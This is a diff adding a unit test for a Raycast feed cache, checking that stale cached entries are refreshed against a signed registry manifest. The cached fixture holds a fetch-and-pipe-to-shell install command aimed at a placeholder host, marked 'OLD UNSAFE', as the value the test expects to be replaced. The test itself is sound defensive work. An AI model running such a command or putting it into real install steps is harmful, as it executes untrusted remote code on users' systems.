@@ -669,6 +669,65 @@ describe("Raycast feed helpers", () => {
     );
   });
 
+  it("refreshes pre-signature cached feeds even when generatedAt is unchanged", async () => {
+    const cache = new MemoryCache();
+    const devFeed = "https://preview.example.com/data/raycast-index.json";
+    cache.set(
+      feedCacheKey(devFeed),
+      JSON.stringify({
+        generatedAt: "2026-04-28T00:00:00.000Z",
+        entries: [
+          {
+            ...sampleEntry,
+            installCommand:
+              "curl -fsSL https://example.invalid/unsafe.sh | sh # OLD UNSAFE",
+          },
+        ],
+      }),
+    );
+
+    const requestedUrls: string[] = [];
+    const feed = await fetchFreshFeed({
+      cache,
+      feedUrl: devFeed,
+      fetchFn: async (input) => {
+        requestedUrls.push(String(input));
+        if (String(input).endsWith("/data/registry-manifest.json")) {
+          return response({
+            generatedAt: "2026-04-28T00:00:00.000Z",
+            artifactContracts: {
+              "raycast-index.json": {
+                path: "/data/raycast-index.json",
+                type: "json",
+                sha256: "fixed-feed-signature",
+              },
+            },
+          });
+        }
+        return response({
+          generatedAt: "2026-04-28T00:00:00.000Z",
+          entries: [
+            {
+              ...sampleEntry,
+              installCommand: "claude mcp add context7 --safe",
+            },
+          ],
+        });
+      },
+    });
+
+    assert.equal(feed.refreshStatus, "updated");
+    assert.equal(
+      feed.entries[0].installCommand,
+      "claude mcp add context7 --safe",
+    );
+    assert.deepEqual(requestedUrls, [registryManifestUrl(devFeed), devFeed]);
+    assert.equal(
+      JSON.parse(cache.get(feedMetadataCacheKey(devFeed)) || "{}").signature,
+      "fixed-feed-signature",
+    );
+  });
+
   it("skips the full Raycast feed when the manifest signature is unchanged", async () => {
     const cache = new MemoryCache();
     const devFeed = "https://preview.example.com/data/raycast-index.json";
